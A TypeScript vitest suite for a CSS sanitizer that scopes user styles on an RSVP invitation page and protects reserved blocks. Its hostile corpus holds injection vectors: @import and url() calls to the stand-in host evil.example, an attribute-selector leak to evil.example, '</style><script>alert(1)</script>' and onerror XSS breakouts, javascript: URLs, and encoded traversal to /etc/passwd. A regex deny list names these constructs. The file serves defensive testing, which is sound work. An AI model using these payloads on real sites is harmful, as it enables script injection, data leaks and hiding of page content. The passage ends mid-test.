import { describe, expect, it } from "vitest";
import { DEFAULT_SCOPE, MAX_CSS_LENGTH, PROTECTED_Z_INDEX, scopeCss } from "./css.js";

const GUARD = ":not(.rsvp-protected):not(.rsvp-protected *)";
const scope = (css: string, options = {}) => scopeCss(css, options);
const codes = (css: string) => scope(css).issues.map((issue) => issue.code);

/** No byte of any output may contain these, whatever the input. */
const FORBIDDEN = [/@import/i, /@font-face/i, /@keyframes/i, /expression\s*\(/i, /javascript:/i, /vbscript:/i, /behavior/i, /-moz-binding/i, /position\s*:\s*(fixed|sticky)/i, /\\/, /image-set/i, /attr\s*\(/i, /!important/i, /--/, /(^|[,{};])\s*(html|body|:root|\*)\s*[,{ ]/i, /visibility/i, /opacity/i, /display\s*:\s*none/i];

function attack(css: string): string {
  const out = scope(css).css;
  expect(out, `"<" in ${JSON.stringify(out)} from ${JSON.stringify(css)}`).not.toMatch(/</);
  for (const pattern of FORBIDDEN) expect(out, `${pattern} in ${JSON.stringify(out)} from ${JSON.stringify(css)}`).not.toMatch(pattern);
  for (const selector of out.split("}").map((chunk) => chunk.split("{")[0] ?? "").filter((chunk) => chunk && !chunk.startsWith("@media"))) {
    for (const piece of selector.split(",")) expect(piece.trim().startsWith(DEFAULT_SCOPE), `unscoped selector ${piece}`).toBe(true);
  }
  return out;
}

describe("scopeCss: what is kept", () => {
  it("prefixes every selector with the scope and guards the protected blocks", () => {
    const { css, issues } = scope("p { color: #333; margin: 0 0 12px } h2, .titulo > span { font-size: 24px }");
    expect(css).toBe(`${DEFAULT_SCOPE} p${GUARD}{color:#333;margin:0 0 12px}\n${DEFAULT_SCOPE} h2${GUARD},${DEFAULT_SCOPE} .titulo > span${GUARD}{font-size:24px}`);
    expect(issues).toEqual([]);
  });

  it("puts the guard before a pseudo-element and keeps allowed pseudo-classes", () => {
    expect(scope("a:hover::before { content: 'x'; color: red }").css).toBe(`${DEFAULT_SCOPE} a:hover${GUARD}::before{content:'x';color:red}`);
    expect(scope("li:nth-child(2n+1) { color: red }").css).toContain("li:nth-child(2n+1)");
    expect(scope("p:not(.a) { color: red }").css).toContain("p:not(.a)");
  });

  it("keeps media queries on screen features and scopes the rules inside", () => {
    const { css } = scope("@media (max-width: 600px) and (prefers-color-scheme: dark) { p { color: #fff } }");
    expect(css).toBe(`@media (max-width: 600px) and (prefers-color-scheme: dark){${DEFAULT_SCOPE} p${GUARD}{color:#fff}}`);
    expect(scope("@media (prefers-reduced-motion: no-preference) { .a { transition: color 200ms ease } }").css).toContain("transition:color 200ms ease");
  });

  it("allows catalogue fonts, gradients, media-store backgrounds, bounded offsets and rotate/scale", () => {
    const css = `.a { font-family: "Playfair Display", serif; background: linear-gradient(#fff, #eee); background-image: url(/media/public/assets/abc/full); margin-left: -12px; transform: rotate(-3deg); font-size: 1rem; z-index: 5; position: relative; color: var(--rsvp-accent) }`;
    const { css: out, issues } = scope(css);
    expect(issues).toEqual([]);
    for (const part of ["font-family:\"Playfair Display\", serif", "linear-gradient", "url(/media/public/assets/abc/full)", "margin-left:-12px", "transform:rotate(-3deg)", "z-index:5", "var(--rsvp-accent)"]) expect(out).toContain(part);
  });

  it("a custom scope can be given, and only as a class", () => {
    expect(scope("p{color:red}", { scope: ".mi-boda" }).css).toContain(".mi-boda p");
    expect(() => scope("p{color:red}", { scope: "body" })).toThrow();
    expect(() => scope("p{color:red}", { scope: ".a .b" })).toThrow();
  });

  it("comments are dropped and the result is stable when scoped output is fed back as comments-free input", () => {
    expect(scope("/* hola */ p { /* x */ color: red }").css).toBe(`${DEFAULT_SCOPE} p${GUARD}{color:red}`);
  });
});

describe("scopeCss: hostile corpus", () => {
  const vectors: readonly string[] = [
    "@import url(https://evil.example/x.css); p { color: red }",
    '@import "https://evil.example/x.css";',
    "@font-face { font-family: X; src: url(https://evil.example/x.woff) }",
    "@keyframes spin { to { transform: rotate(360deg) } }",
    "@charset 'utf-8'; p { color: red }",
    "@namespace svg url(http://www.w3.org/2000/svg);",
    "@page { margin: 0 }",
    "@supports (display: grid) { p { color: red } }",
    "@container (min-width: 1px) { p { color: red } }",
    "@layer x { p { color: red } }",
    "@scope (body) { p { color: red } }",
    "@property --x { syntax: '<color>'; inherits: false }",
    "html { display: none }",
    "body { background: red }",
    ":root { --x: 1 }",
    "* { color: red }",
    "html body p { color: red }",
    "p, body { color: red }",
    "body > p { color: red }",
    ":host { color: red }",
    "::backdrop { color: red }",
    "p { position: fixed; top: 0; left: 0; width: 100%; height: 100% }",
    "p { position: sticky }",
    "p { position: FIXED }",
    "p { position: fixed !important }",
    "p { background: url(https://evil.example/t.gif) }",
    "p { background: url(//evil.example/t.gif) }",
    "p { background: url('data:image/svg+xml,<svg onload=alert(1)>') }",
    "p { background: url(javascript:alert(1)) }",
    "p { background-image: url(/media/public/assets/../../etc/passwd) }",
    "p { background: image-set('https://evil.example/a.png' 1x) }",
    "p { list-style: url(https://evil.example/a.png) }",
    "p { content: url(https://evil.example/a.png) }",
    "p { content: attr(href) }",
    "p { width: expression(alert(1)) }",
    "p { behavior: url(x.htc) }",
    "p { -moz-binding: url(x.xml#a) }",
    "p { color: red; background: u\\72l(https://evil.example/t.gif) }",
    "p { color: \\72 ed }",
    "p\\20 { color: red }",
    ".a\\.b { color: red }",
    "p { --x: url(https://evil.example/t.gif); background: var(--x) }",
    "p { background: var(--x) }",
    "p { visibility: hidden }",
    "p { opacity: 0 }",
    "p { display: none }",
    "p { clip-path: inset(100%) }",
    "p { filter: blur(0) opacity(0) }",
    "p { mask: linear-gradient(#000, transparent) }",
    "p { overflow: hidden; max-height: 0 }",
    "p { pointer-events: none }",
    "p { font-size: 0 }",
    "p { font-size: 12px }",
    "p { font-size: 0.5rem }",
    "p { font-size: calc(1px) }",
    "p { z-index: 9999 }",
    "p { z-index: 1000 }",
    "p { margin-left: -99999px }",
    "p { top: -5000px; position: relative }",
    "p { text-indent: -9999px }",
    "p { transform: translateY(5000px) }",
    "p { transform: scale(0) }",
    "p { font-family: 'Comic Sans MS' }",
    "p { color: red; } } p { color: blue }",
    "p { color: red",
    "p { animation: x 1s infinite }",
    "p { transition: all 1s; mix-blend-mode: difference }",
    ".rsvp-protected { color: red }",
    ".rsvp-gifts-cta { display: none }",
    ".de-bar { display: none }",
    "[data-rsvp-protected] { opacity: 0 }",
    "a[href^='https://'] { background: url(https://evil.example/leak?x) }",
    "#gifts { display: none }",
    "p:has(.rsvp-protected) { color: red }",
    "p:is(body) { color: red }",
    "p::part(x) { color: red }",
    "svg { width: 1px }",
    "button { display: none }",
    "p { color: red; & b { color: blue } }",
    "@media (min-width: 1px) { @media (max-width: 9px) { p { color: red } } }",
    "@media screen and (-webkit-min-device-pixel-ratio: 0) { p { color: red } }",
    "@media (min-width: expression(alert(1))) { p { color: red } }",
    "p { color: red\u0000; background: url(x) }",
    // Round 1 (M2): encoded dot segments in the media-store path.
    "p { background: url(/media/public/assets/%2e%2e/%2e%2e/etc/passwd) }",
    "p { background: url(/media/public/assets/%2E%2E/secret) }",
    "p { background: url(/media/public/assets/%252e%252e/secret) }",
    "p { background: url(/media/public/assets/.%2e/secret) }",
    "p { background: url(/media/public/assets/%2e./secret) }",
    "p { background: url(/media/public/assets/a%2f%2fb) }",
    "p { background: url(/media/public/assets/a%5cb) }",
    // Round 1 (M3, m2): selectors that start with a combinator or carry a namespace.
    "+ .a { color: red }",
    "~ .a { color: red }",
    "> .a { color: red }",
    "svg|a { color: red }",
    "*|* { color: red }",
    "|a { color: red }",
    // Round 1 (M6, P22): sizes that could push or cover the protected blocks.
    "p { padding-top: 99999px }",
    "p { padding: 0 0 5000px }",
    "p { padding-left: 99999rem }",
    "p { height: 99999px }",
    "p { min-height: 100000px }",
    "p { max-height: 3000px }",
    "p { width: 99999px }",
    "p { inset: -99999px }",
    "p { top: 5000px; position: relative }",
    "p { bottom: 99999px; position: absolute }",
    "p { grid-template-columns: repeat(99999, 1fr) }",
    "p { grid-template-rows: repeat(1000, 10px) }",
    "p { grid-template-columns: 99999px 1fr }",
    "p { outline: 99999px solid red }",
    "p { outline-width: 500px }",
    "p { box-shadow: 0 0 99999px red }",
    "p { box-shadow: 0 0 0 5000px red }",
    "p { letter-spacing: 999px }",
    "p { word-spacing: 9999px }",
    "p { line-height: 99999 }",
    "p { line-height: 9999px }",
    "p { font-size: 99999px }",
    "p { font-size: clamp(13px, 5vw, 99999px) }",
    "p { padding: calc(1px * 99999) }",
    "p { padding: calc(1rem*20000) }",
    "p { padding: calc(100% + 99999px) }",
    "p { padding: 100000vh }"
  ];

  it.each(vectors)("neutralises %s", (vector) => { attack(vector); });

  it("keeps the harmless part of a mixed sheet and reports what it dropped", () => {
    const { css, issues } = scope("p { color: red; position: fixed; background: url(https://evil.example/x); margin: 4px }");
    expect(css).toBe(`${DEFAULT_SCOPE} p${GUARD}{color:red;margin:4px}`);
    expect(issues.map((issue) => issue.code)).toEqual(["VALUE_REJECTED", "VALUE_REJECTED"]);
  });

  it("rejects the exact forbidden values by code", () => {
    expect(codes("@import url(x);")).toContain("AT_RULE_REMOVED");
    expect(codes("body{color:red}")).toContain("SELECTOR_REJECTED");
    expect(codes("p{opacity:0}")).toContain("PROPERTY_REJECTED");
    expect(codes("p{position:fixed}")).toContain("VALUE_REJECTED");
    expect(codes("p{color:red!important}")).toContain("IMPORTANT_REMOVED");
    expect(codes("p{color:\\72 ed}")).toContain("ESCAPE_REJECTED");
    expect(codes("@media (foo: 1) { p { color: red } }")).toContain("MEDIA_REJECTED");
    expect(codes("p{color:red")).toEqual(["SYNTAX"]);
    expect(scope("p{color:red").css).toBe("");
  });

  it("no rule survives that could reach the reserved classes or the protected blocks", () => {
    expect(scope(".rsvp-gifts-cta{color:red}").css).toBe("");
    expect(scope(".rsvp-protected, .rsvp-protected *{color:red}").css).toBe("");
    expect(scope("p .rsvp-protected{color:red}").css).toBe("");
    expect(scope("p:not(.rsvp-protected){color:red}").css).toBe("");
    const guarded = scope("div p{color:red}").css;
    expect(guarded).toContain(GUARD);
  });

  it("a rule with a mix of good and bad selectors keeps only the good ones", () => {
    expect(scope("p, body, .a { color: red }").css).toBe(`${DEFAULT_SCOPE} p${GUARD},${DEFAULT_SCOPE} .a${GUARD}{color:red}`);
  });

  it("limits length and the number of rules", () => {
    expect(scope("p{color:red}".repeat(MAX_CSS_LENGTH)).issues[0]?.code).toBe("TOO_LONG");
    const many = scope(Array.from({ length: 450 }, (_, index) => `.c${index}{color:red}`).join(""));
    expect(many.issues.some((issue) => issue.code === "TOO_MANY_RULES")).toBe(true);
    expect((many.css.match(/\{/g) ?? []).length).toBe(400);
  });

  it("the protected z-index is out of any author's reach", () => {
    expect(PROTECTED_Z_INDEX).toBeGreaterThan(100);
    expect(scope("p{z-index:101}").css).toBe("");
    expect(scope("p{z-index:100}").css).toContain("z-index:100");
  });

  it("an unparseable sheet gives an empty result with a SYNTAX issue", () => {
    expect(scope("p { color: red; } @media").issues.length).toBeGreaterThan(0);
    expect(scope("}}}{{{").css).toBe("");
  });
});

describe("scopeCss: round 1 (M3, M4, M6, m2)", () => {
  it("is idempotent: scoping its own output returns the same text and no issues", () => {
    const samples = [
      "p { color: #333; margin: 0 0 12px } h2, .titulo > span { font-size: 24px }",
      "a:hover::before { content: 'x'; color: red }",
      "li:nth-child(2n+1) { color: red } p:not(.a) { color: red }",
      "@media (max-width: 600px) and (prefers-color-scheme: dark) { p { color: #fff } }",
      ".a { font-family: \"Playfair Display\", serif; background: linear-gradient(#fff, #eee); margin-left: -12px; transform: rotate(-3deg); line-height: 1.5; padding: 8px 16px }"
    ];
    for (const sample of samples) {
      const once = scope(sample);
      const twice = scope(once.css);
      expect(twice.issues, sample).toEqual([]);
      expect(twice.css, sample).toBe(once.css);
    }
  });

  it("an author who writes the scope class themselves is read as a descendant of it, and cannot reach the protected blocks", () => {
    expect(scope(".rsvp-invitation p { color: red }").css).toBe(scope("p { color: red }").css);
    expect(scope(".rsvp-invitation .rsvp-protected { color: red }").css).toBe("");
  });

  it("keeps a combinator between compounds but refuses one at the start", () => {
    expect(scope("p + p { color: red }").css).toContain("p + p");
    expect(codes("+ .a { color: red }")).toContain("SELECTOR_REJECTED");
    expect(scope("+ .a, p { color: red }").css).toBe(`${DEFAULT_SCOPE} p${GUARD}{color:red}`);
  });

  it("keeps sizes inside the documented bounds and accepts ordinary designs", () => {
    const ok = "section { padding: 48px 24px; margin: 0 auto; max-width: 640px; width: 100%; min-height: 100vh; height: auto; line-height: 1.6; letter-spacing: 0.05em; box-shadow: 0 8px 24px rgba(0,0,0,.2); outline: 2px solid #333; font-size: clamp(1.5rem, 4vw, 3rem); display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px }";
    const { css, issues } = scope(ok);
    expect(issues).toEqual([]);
    for (const part of ["padding:48px 24px", "min-height:100vh", "repeat(3, 1fr)", "line-height:1.6", "box-shadow:0 8px 24px rgba(0,0,0,.2)"]) expect(css).toContain(part);
    expect(codes("p { padding-top: 99999px }")).toContain("VALUE_REJECTED");
    expect(scope("p { padding-top: 99999px }").css).toBe("");
    expect(scope("p { padding-top: 400px }").css).toContain("padding-top:400px");
  });
});

/** One declaration in a rule; the whole rule must disappear (nothing else is in it), and the issue must be a value or property refusal. */
const declaration = (text: string) => scope(`p { ${text} }`);

describe("scopeCss: round 2 (R2-M1, R2-M2, R2-M3, R2-m2): typed values evaluated in the worst case", () => {
  const sums = [
    "width: calc(1600px + 1600px)", "width: calc(1000px + 1000px)", "padding: calc(400px + 400px)", "padding: calc(200px + 201px)", "height: calc(2000px + 1px)",
    `padding: calc(${Array.from({ length: 400 }, () => "1px").join(" + ")})`, `padding: calc(${Array.from({ length: 80 }, () => "1px").join(" + ")})`,
    "margin-left: calc(-300px - 300px)", "top: calc(100% + 100%)", "padding: calc(100vw * 2)", "padding: min(1600px, 2000px)", "padding: max(10px, 500px)", "padding: clamp(1px, 500px, 600px)",
    "padding: calc(2 * 300px)", "padding: calc(300px * 2)", "padding: calc(900px / 2)", "padding: calc((300px + 300px))", "padding: calc(1px * 1px)", "padding: calc(1px + 1)", "padding: calc(1px / 0)", "padding: calc(1px / 0.001)", "padding: calc(1px / 1px)",
    "padding: calc(1px*500)", "padding: calc(1px +500px)", "padding: calc()", "padding: calc(1px + )", "padding: calc(1px 2px)", "padding: calc(min(max(clamp(1px, 2px, 3px), 1px), 2px))", "padding: calc(calc(calc(calc(1px))))",
    "padding: calc(var(--rsvp-x) * 99999)", "padding: min(var(--rsvp-a), 1px)", "padding: calc(1px + attr(x px))", "padding: calc(1px + env(safe-area-inset-top))",
    "box-shadow: 0 0 99px red, 0 0 99px red, 0 0 99px red", "box-shadow: 0 0 99px 99px red, 0 0 99px 101px red", "box-shadow: 0 0 calc(60px + 60px) red", "text-shadow: 0 0 1px red, 0 0 1px red, 0 0 1px red", "box-shadow: 0px 0px 0px 0px 0px red",
    "grid-template-rows: repeat(24, 1600px)", "grid-template-columns: repeat(24, 100%)", "grid-template-columns: repeat(2, 1000px)", "grid-template-columns: 1600px 1px", "grid-template-columns: repeat(25, 1fr)", "grid-template-columns: repeat(0, 1fr)", "grid-template-columns: repeat(2, repeat(2, 1fr))",
    "grid-template-columns: minmax(1600px, 1fr) 100px", "grid-template: repeat(24, 1600px) / 1fr", "grid: repeat(24, 1600px) / 1fr", "grid-auto-rows: 2001px", "grid-auto-columns: calc(1000px + 1000px)", "grid-template-columns: repeat(auto-fill, 1601px)",
    "transform: scale(2) scale(2) scale(2)", "transform: scale(2) scale(2)", "transform: scale(calc(100))", "transform: scale(var(--rsvp-x))", "transform: scale(2.1)", "transform: scale(0.5)", "transform: scale(0.99)", "transform: scale(1, 3)", "transform: scale(1, 1, 1)", "transform: scaleX(0.5)", "transform: scaleY(3)",
    "transform: rotate(1deg) translateX(1px)", "transform: rotate(181deg)", "transform: rotate(1turn)", "transform: rotate(calc(10deg))", "transform: translate(9999px)", "transform: translateX(-100%)", "transform: translateY(801px)", "transform: translate(1px, 2px, 3px)", "transform: translate(calc(500px + 500px))", "transform: translate3d(1px, 1px, 1px)",
    "transform: skew(80deg)", "transform: matrix(1, 0, 0, 1, 9999, 9999)", "transform: perspective(1px)", "transform: none rotate(1deg)", "transform: rotate()"
  ];
  const sizes = [
    "border: 9999px solid red", "border: 21px solid red", "border-width: 100vh", "border-top: 9999px solid", "border-left-width: 1px", "border-bottom: 100vw solid red", "border-spacing: 9999px", "border-spacing: 30px 1px", "border-width: 5%",
    "outline: 100vw solid red", "outline-offset: 99999px", "outline-width: 21px", "flex-basis: 99999px", "flex: 1 1 99999px", "flex: 1 1 calc(1000px + 1000px)", "flex: 101 1 auto", "flex-grow: 99999", "flex-shrink: 101", "order: 99999",
    "aspect-ratio: 1 / 1000", "aspect-ratio: 1000", "aspect-ratio: 0.2", "aspect-ratio: 4.1", "aspect-ratio: 1 / 0", "aspect-ratio: 0", "aspect-ratio: 1 / 5", "aspect-ratio: 5 / 1", "aspect-ratio: auto 1 / 1000", "aspect-ratio: calc(1) / 1",
    "vertical-align: -9999px", "vertical-align: 10px", "vertical-align: 50%", "column-count: 1000", "column-count: 5", "columns: 5", "columns: 2000px 2", "columns: 99px 1000",
    "grid-column: 1 / 9999", "grid-column: span 99999", "grid-row: 1 / span 25", "grid-column: -25 / 1", "grid-area: 1 / 2 / 9999 / 4",
    "transform-origin: -99999px", "transform-origin: 99999% 0", "transform-origin: 401px 0", "transform-origin: 1px 1px 99999px",
    "letter-spacing: 100vw", "letter-spacing: 21px", "letter-spacing: 5%", "letter-spacing: 1em", "letter-spacing: 1000em", "word-spacing: 100vw", "word-spacing: 41px", "word-spacing: 20em", "gap: 100vh", "gap: 201px", "row-gap: 100vw", "column-gap: 50em", "gap: 20%",
    "line-height: 100vh", "line-height: 100vw", "line-height: 1000px", "line-height: 5px", "line-height: 0.1em", "line-height: 9em", "line-height: 5", "line-height: 0.5", "line-height: 500%", "line-height: 50%", "line-height: calc(100vh)",
    "text-indent: 100em", "text-indent: -9999px", "text-underline-offset: 100vw", "text-decoration: underline 99px", "margin: 25em", "margin-top: -25em", "margin-left: -100vw", "margin: 0 0 0 -200%", "top: 100vh", "left: -100em", "inset: -100vw",
    "padding: 25em", "padding: 100em", "padding: 100ch", "padding: 100ex", "padding: 4em", "padding: 100vw", "padding: 100vh", "padding: 100svh", "padding: 100dvh", "padding: 100lvh", "padding: 100vmin", "padding: 100vmax", "padding: 100cqw", "padding: 100cqh", "padding: 100cqmin", "padding: 100vi", "padding: 100vb", "padding: 1e3px",
    "padding: 1000%", "padding: 50%", "padding: 99999q", "padding: 100cm", "padding: 100in", "padding: 400px 1px 1px 401px", "padding-left: 9999pt", "padding: 1fr", "padding: 1s", "padding: 1deg", "padding: 1dppx", "padding: attr(x)", "padding: env(safe-area-inset-top)", "padding: var(--x)",
    "width: 100em", "width: 200%", "width: 1601px", "width: fit-content(99999px)", "max-width: 99999px", "min-width: 100em", "width: 101vw", "height: 2001px", "height: 101vh", "min-height: 200vh", "max-height: 3000px", "height: 100em",
    "box-shadow: 0 0 0 100vw red", "box-shadow: 0 0 0 100vh red", "box-shadow: 0 0 101px red", "box-shadow: 0 0 1em red", "box-shadow: 0 0 100em red", "text-shadow: 0 0 100vw red", "text-shadow: 0 0 20em red", "box-shadow: 0 0 0 5% red",
    "border-radius: 9999999px", "border-radius: 100000%", "transition: all 99s", "transition-duration: 11s", "transition-delay: 100000ms", "transition: color 1h", "transition: all 1s, all 1s, all 1s, all 1s, all 1s, all 1s, all 1s, all 1s, all 1s",
    "background-size: 99999px", "background-position: -99999px 0", "background: linear-gradient(red 99999px, blue)", "background: linear-gradient(red 999999%, blue)", "background: red, red, red, red, red", "background: foo(1)",
    "object-position: 99999px"
  ];
  const fonts = [
    "font-size: 8em", "font-size: 0.82em", "font-size: 1em", "font-size: 100%", "font-size: 12.99px", "font-size: 0.8rem", "font-size: 129px", "font-size: 8.1rem", "font-size: larger", "font-size: smaller", "font-size: xx-small", "font-size: x-small",
    "font-size: calc(1rem - 4px)", "font-size: calc(1em + 1px)", "font-size: 4vw", "font-size: 100vw", "font-size: clamp(10px, 4vw, 3rem)", "font-size: clamp(1rem, 1em, 2rem)", "font-size: clamp(1rem, 50vw, 9rem)", "font-size: min(20px, 2vw)", "font-size: max(1rem, 1ch)", "font-size: 1ex",
    "font-size: 20px 30px", "font-size: var(--rsvp-x)", "font-size: 0", "font-size: 13", "font-size: calc(var(--rsvp-x))"
  ];
  const others = [
    "zoom: 5", "font: 12px/1 serif", "translate: 9999px", "scale: 0.1", "rotate: 3deg", "padding-block: 9999px", "margin-inline: 9999px", "inset-block: 9999px", "inline-size: 9999px", "block-size: 9999px", "max-inline-size: 99999px", "perspective: 1px", "contain: size", "content-visibility: hidden", "will-change: transform", "resize: both", "cursor: url(https://evil.example/c.png), auto", "scroll-margin: 99999px", "animation-duration: 99s", "backdrop-filter: blur(1px)", "text-size-adjust: 1%", "-webkit-text-size-adjust: 1%", "mix-blend-mode: difference", "isolation: isolate",
    "color: attr(x)", "color: env(x)", "color: var(--x, red)", "color: var(--rsvp-x, red)", "color: calc(1px)", "color: rgb(1px, 2, 3)", "color: rgb(url(x))", "background-color: foo(1)", "content: attr(x)", "content: counter(x)", "list-style: url(/media/public/assets/a/full)", "border-image: url(/media/public/assets/a/full)", "background: url(/media/public/assets/a/full), url(/media/public/assets/a/full), url(/media/public/assets/a/full), url(/media/public/assets/a/full), url(/media/public/assets/a/full)"
  ];
  const hostile = [...sums, ...sizes, ...fonts, ...others];

  it("every worst-case vector is refused, and nothing of its rule survives", () => {
    const survivors = hostile.filter((vector) => {
      const out = declaration(vector.split(";")[0] as string);
      return out.css !== "" || out.issues.length === 0;
    });
    expect(survivors).toEqual([]);
  });

  it("the whole corpus also passes the byte-level attack checks", () => {
    for (const vector of hostile) attack(`p { ${vector} }`);
  });

  it("evaluates the worst case: em is up to 128px, % up to the largest box, vw/vh up to the largest screen", () => {
    expect(declaration("padding: 3em").css).toContain("padding:3em");
    expect(declaration("padding: 3.2em").css).toBe("");
    expect(declaration("padding: 400px").css).toContain("padding:400px");
    expect(declaration("padding: 25vw").css).toContain("padding:25vw");
    expect(declaration("padding: 25.1vw").css).toBe("");
    expect(declaration("padding: 20vh").css).toContain("padding:20vh");
    expect(declaration("padding: 20.1vh").css).toBe("");
    expect(declaration("padding: 25%").css).toContain("padding:25%");
    expect(declaration("padding: 25.1%").css).toBe("");
    expect(declaration("width: 100vw").css).toContain("width:100vw");
    expect(declaration("min-height: 100vh").css).toContain("min-height:100vh");
    expect(declaration("padding: calc(100px + 300px)").css).toContain("calc(100px + 300px)");
    expect(declaration("padding: calc(100px + 301px)").css).toBe("");
    expect(declaration("padding: min(100vw, 400px)").css).toContain("min(100vw, 400px)");
    expect(declaration("padding: clamp(1px, 100vw, 400px)").css).toContain("clamp(1px, 100vw, 400px)");
    expect(declaration("padding: calc(100px * 4)").css).toContain("calc(100px * 4)");
    expect(declaration("padding: calc(800px / 2)").css).toContain("calc(800px / 2)");
    expect(declaration("padding: calc(min(max(1px, 2px), 3px))").css).toContain("calc(min(max(1px, 2px), 3px))");
    expect(declaration("font-size: clamp(1.5rem, 4vw, 3rem)").css).toContain("clamp(1.5rem, 4vw, 3rem)");
    expect(declaration("font-size: 13px").css).toContain("font-size:13px");
    expect(declaration("font-size: 128px").css).toContain("font-size:128px");
    expect(declaration("font-size: 8rem").css).toContain("font-size:8rem");
    expect(declaration("line-height: 1.5em").css).toContain("line-height:1.5em");
  });

  it("accepts ordinary designs that stay inside the grammar", () => {
    const designs = [
      "margin: 0 auto", "width: min(100%, 640px)", "padding: clamp(16px, 4vw, 48px)", "width: calc(100% - 32px)", "transform: translateX(-50%)", "transform: scale(1.05)", "transform: rotate(-4deg)", "aspect-ratio: 16 / 9", "aspect-ratio: auto 4 / 3", "aspect-ratio: 1",
      "border: 1px solid var(--rsvp-accent)", "border-bottom: 2px dashed #ccc", "box-shadow: 0 2px 8px rgba(0,0,0,.2), 0 8px 24px rgba(0,0,0,.1)", "box-shadow: inset 0 0 0 1px #000", "text-shadow: 0 1px 2px #000", "flex: 1 1 0", "flex: 0 0 300px", "flex-basis: 50%",
      "grid-template-columns: repeat(auto-fit, minmax(200px, 1fr))", "grid-template-columns: 1fr 2fr", "grid-template-columns: repeat(3, 1fr)", "grid-template-columns: [full-start] minmax(1rem, 1fr) [content-start] minmax(0, 40rem) [full-end]", "grid-template-rows: auto 1fr auto", "grid-template-areas: 'a b' 'c d'", "grid-column: 1 / span 2", "grid-row: 2", "grid-area: 1 / 1 / 3 / 3",
      "column-count: 2", "columns: 200px 3", "border-radius: 9999px", "border-radius: 10px / 20px", "transition: color 200ms ease, background 0.3s cubic-bezier(.4,0,.2,1)", "transition: opacity 1s steps(4, end)", "transform-origin: 50% 0", "transform-origin: left top", "vertical-align: middle",
      "font-size: 1.25rem", "font-size: large", "font-size: calc(1rem + 1vw)", "font-size: clamp(1rem, 2vw + 1rem, 3rem)", "line-height: 1.6", "line-height: 24px", "line-height: 150%", "letter-spacing: 0.05em", "letter-spacing: -1px", "word-spacing: 2px",
      "background: linear-gradient(180deg, rgba(0,0,0,0) 0%, #000 100%)", "background: url(/media/public/assets/abc/full) center / cover no-repeat", "background: radial-gradient(circle at 50% 50%, #fff, #eee)", "background-position: 50% 50%", "background-size: cover", "object-position: 50% 0",
      "gap: 1rem 2rem", "padding: 3em", "margin-left: -2rem", "text-indent: 2em", "top: 50%", "outline: 2px solid red", "outline-offset: 2px", "text-decoration: underline 2px", "color: rgb(10 20 30 / 50%)", "color: hsl(120deg 50% 50%)", "color: #abc", "color: currentcolor", "z-index: -1", "height: auto", "min-height: 50vh", "max-width: 100%", "width: fit-content(400px)"
    ];
    for (const text of designs) {
      const out = declaration(text);
      expect(out.issues, text).toEqual([]);
      expect(out.css, text).not.toBe("");
    }
  });

  it("keeps every earlier accepted design idempotent under the new grammar", () => {
    const sample = "section { padding: 48px 24px; margin: 0 auto; max-width: 640px; width: 100%; min-height: 100vh; font-size: clamp(1.5rem, 4vw, 3rem); box-shadow: 0 8px 24px rgba(0,0,0,.2), 0 1px 2px #000; grid-template-columns: repeat(3, 1fr); aspect-ratio: 16 / 9; transform: rotate(2deg); transition: color 200ms ease; flex: 1 1 0; border: 1px solid var(--rsvp-accent) }";
    const once = scope(sample);
    expect(once.issues).toEqual([]);
    const twice = scope(once.css);
    expect(twice.issues).toEqual([]);
    expect(twice.css).toBe(once.css);
  });

  it("a whitespace before the comma or at the end does not turn the selector into a descendant of everything (R2-m2)", () => {
    expect(scope("a , b { color: red }").css).toBe(`${DEFAULT_SCOPE} a${GUARD},${DEFAULT_SCOPE} b${GUARD}{color:red}`);
    expect(scope(".x ,.y { color: red }").css).toBe(`${DEFAULT_SCOPE} .x${GUARD},${DEFAULT_SCOPE} .y${GUARD}{color:red}`);
    expect(scope("a:hover , b::before { color: red }").css).toBe(`${DEFAULT_SCOPE} a:hover${GUARD},${DEFAULT_SCOPE} b${GUARD}::before{color:red}`);
    expect(scope("a > { color: red }").css).toBe("");
    expect(codes("a + { color: red }")).toContain("SELECTOR_REJECTED");
    const once = scope("a , b { color: red }");
    expect(scope(once.css).css).toBe(once.css);
  });

  it("properties outside the allowlist are refused with a property issue", () => {
    for (const property of ["zoom", "translate", "scale", "rotate", "font", "padding-block", "inset-inline", "inline-size", "perspective", "cursor", "resize", "contain", "will-change", "animation", "mix-blend-mode", "backdrop-filter", "text-size-adjust", "border-image", "scroll-margin"]) {
      expect(declaration(`${property}: 1px`).issues.map((issue) => issue.code), property).toContain("PROPERTY_REJECTED");
    }
  });
});

describe("scopeCss: round 3 (R3-M1, R3-m1, R3-m2, R3-m3)", () => {
  const refused = (css: string) => { const out = scope(css); return out.css === "" && out.issues.length > 0; };

  it("R3-M1: nothing that closes or opens markup survives in a value, a string or a selector", () => {
    const vectors = [
      'p::before { content: "</style><script>alert(1)</script>" }',
      'p::before { content: "</STYLE><img src=x onerror=alert(1)>" }',
      'p::before { content: "<!--" }',
      'p::before { content: "-->" }',
      'p::before { content: "a</b" }',
      "p::before { content: '</style>' }",
      "p.a<b { color: red }",
      "p.a</style><script>alert(1)</script> { color: red }",
      "p.a<!-- { color: red }",
      "p { font-family: \"</style>\" }",
      "p { background: url(/media/public/assets/a</style>/full) }",
      "p { color: red; } /* </style> */ q { color: <red }"
    ];
    for (const vector of vectors) {
      const out = attack(vector);
      expect(out, vector).not.toMatch(/<|-->/);
    }
    expect(refused('p::before { content: "</style><script>alert(1)</script>" }')).toBe(true);
    expect(refused("p.a<b { color: red }")).toBe(true);
    expect(scope("p::before { content: 'a > b' }").css).toBe("");
  });

  it("R3-m1: a non-finite result of the evaluator is refused, not read as inside the bound", () => {
    for (const vector of ["width: calc(1e308 * 1e308 * 0 * 1px)", "padding: calc(1e308px * 1e308 * 0)", "margin: calc(1e308px * 1e308)", "font-size: calc(1e308 * 1e308 * 0 * 1px)", "top: min(calc(1e308px * 1e308 * 0), 1px)", "line-height: calc(1e308 * 1e308 * 0 * 1px)", "gap: calc(1e308px + 1e308px + 1e308px * 1e308)", "width: clamp(1px, calc(1e308px * 1e308 * 0), 2px)"]) {
      expect(refused(`p { ${vector} }`), vector).toBe(true);
      attack(`p { ${vector} }`);
    }
  });

  it("R3-m2: a length property takes a bare number only when it is 0", () => {
    for (const vector of ["padding: 1000", "margin: -1000", "top: -1000", "width: 999", "height: 1000", "gap: 5", "padding: calc(1000 * 1)", "grid-template-columns: 100 1fr", "border-radius: 10"]) {
      expect(refused(`p { ${vector} }`), vector).toBe(true);
    }
    for (const vector of ["padding: 0", "margin: 0 auto", "top: 0", "flex: 1 1 0", "columns: 3 200px", "columns: 200px 3"]) {
